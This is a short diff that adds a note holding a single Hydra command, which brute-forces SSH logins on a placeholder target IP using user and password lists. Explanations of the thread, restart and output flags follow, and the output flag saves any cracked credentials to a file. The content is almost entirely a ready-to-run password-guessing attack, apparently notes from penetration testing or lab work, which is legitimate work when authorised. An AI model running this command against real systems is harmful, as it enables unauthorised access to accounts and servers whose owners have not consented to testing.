@@ -1,0 +1,19 @@
+
+
+
+
+
+
+
+
+
+
+
+hydra -L users.txt -P passwords.txt <TARGET-IP> ssh -t 4 -f -V -I -o cracked.txt
+
+----------------------------------------
+
+-t 4: Essential for SSH to avoid "Connection refused" errors.
+-I: Ignores existing restore files (starts a fresh attack).
+-o cracked.txt: Automatically saves any found credentials to a file.
+
